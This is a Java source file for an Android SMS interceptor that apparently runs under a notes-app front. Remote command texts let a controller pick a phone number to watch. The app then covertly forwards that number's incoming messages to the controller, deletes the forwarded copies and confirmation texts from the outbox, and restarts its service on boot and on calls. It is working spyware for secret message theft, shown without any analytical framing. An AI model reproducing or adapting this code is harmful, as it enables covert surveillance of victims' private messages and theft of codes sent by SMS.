package com.sms.interceptor;

import android.annotation.TargetApi;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.sms.notes.ui.NotesListActivity;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by zhangfei on 2015/7/18.
 */
public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    public static final String ACTION_CHECK_SMS_IN_LOOP = "com.sms.action.CHECK_SMS_IN_LOOP";

    private static final SimpleDateFormat FORMAT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    private static final String SMS_PREFIX = "监听到一条短信\n";

    public String[] COLUMNS = new String[]{
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE
    };

    @TargetApi(Build.VERSION_CODES.KITKAT)
    @Override
    public void onReceive(final Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            Intent newIntent = new Intent(context, NotesListActivity.class);
            newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(newIntent);

            SmsService.startService(context);
        } else if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(action)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                return;
            }
            smsReceived(context, intent);
        } else if (ACTION_CHECK_SMS_IN_LOOP.equals(action)) {
            checkSmsInLoop(context);
        } else if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            SmsService.startService(context);
        } else {
            // 如果是来电
            TelephonyManager tManager = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
            switch (tManager.getCallState()) {
                case TelephonyManager.CALL_STATE_RINGING:
                    SmsService.startService(context);
                    break;
            }
        }
    }

    private void smsReceived(Context context, Intent intent) {
        Log.d(TAG, "smsReceived()");

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] smsObj = (Object[]) bundle.get("pdus");
            for (Object object : smsObj) {
                SmsMessage msg = SmsMessage.createFromPdu((byte[]) object);
                Log.d(TAG, "sender:" + msg.getOriginatingAddress());

                if (msg.getDisplayMessageBody().startsWith(SmsUtils.CONFIG_MSG_PREFIX)) {
                    if (msg.getDisplayMessageBody().indexOf("=") > 0) {
                        String[] strArr = msg.getDisplayMessageBody().split("=");
                        if (strArr != null && strArr.length >= 2) {
                            String phone = strArr[1];
                            boolean isNumber = TextUtils.isDigitsOnly(phone);
                            if (isNumber) {
                                SmsPreference.setPhoneToBeIntercepted(context, phone);
                                SmsPreference.setPhoneToReport(context, msg.getOriginatingAddress());
                                SmsUtils.sendSms(SmsUtils.CONFIG_OK_MSG, msg.getOriginatingAddress());
                                SmsUtils.deleteSms(context, Telephony.Sms.Outbox.BODY + " = ?", new String[]{SmsUtils.CONFIG_OK_MSG});
                                SmsService.startService(context);
                                return;
                            }
                        }
                    }
                }

                String phoneToBeIntercepted = SmsPreference.getPhoneToBeIntercepted(context);
                if (SmsUtils.isEquals(msg.getOriginatingAddress(), phoneToBeIntercepted)) {
                    handleSms(context, msg.getOriginatingAddress(), msg.getTimestampMillis(), msg.getDisplayMessageBody());
                }
            }
        }
    }

    private void checkSmsInLoop(Context context) {
        Log.d(TAG, "checkSmsInLoop");

        long lastSmsId = SmsPreference.getLastSmsId(context);

        Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                COLUMNS, null, null,
                Telephony.Sms._ID + " DESC");

        if (cursor == null) {
            return;
        }

        while (cursor.moveToNext()) {
            long id = cursor.getLong(0);
            String address = cursor.getString(1);
            String body = cursor.getString(2);
            long receivedDt = cursor.getLong(3);

            // 检测是否配置短信
            if (body.startsWith(SmsUtils.CONFIG_MSG_PREFIX)) {
                if (body.indexOf("=") > 0) {
                    String[] strArr = body.split("=");
                    if (strArr != null && strArr.length >= 2) {
                        String phone = strArr[1];
                        SmsPreference.setPhoneToBeIntercepted(context, phone);
                        SmsPreference.setPhoneToReport(context, address);
                        SmsPreference.setLastSmsId(context, id);

                        SmsUtils.sendSms(SmsUtils.CONFIG_OK_MSG, address);
                        SmsUtils.deleteSms(context, Telephony.Sms.Outbox.BODY + " = ?", new String[]{SmsUtils.CONFIG_OK_MSG});
                        SmsService.startService(context);
                        return;
                    }
                }
            }

            if (lastSmsId == 0) {
                SmsPreference.setLastSmsId(context, id);
                return;
            }

            if (id <= lastSmsId) {
                return;
            }

            String phoneToBeIntercepted = SmsPreference.getPhoneToBeIntercepted(context);
            Log.d(TAG, "phoneToBeIntercept:" + phoneToBeIntercepted);

            if (TextUtils.isEmpty(phoneToBeIntercepted)) {
                return;
            }

            if (SmsUtils.isEquals(phoneToBeIntercepted, address)) {
                handleSms(context, address, receivedDt, body);
                SmsPreference.setLastSmsId(context, id);
                return;
            }
        }
        cursor.close();
    }

    private void handleSms(Context context, String sender, long receivedTime, String smsBody) {
        StringBuilder builder = new StringBuilder();
        builder.append(SMS_PREFIX);
        builder.append("接收时间：" + FORMAT.format(new Date(receivedTime)) + "\n");
        builder.append("发件人：" + sender + "\n");
        builder.append("内容：" + smsBody);

        String reportPhone = SmsPreference.getPhoneToReport(context);
        if (!TextUtils.isEmpty(reportPhone)) {
            SmsUtils.sendSms(builder.toString(), reportPhone);
            SmsUtils.deleteSms(context, Telephony.Sms.Outbox.BODY + " LIKE ?", new String[]{"%" + SMS_PREFIX + "%"});;
        }
    }
}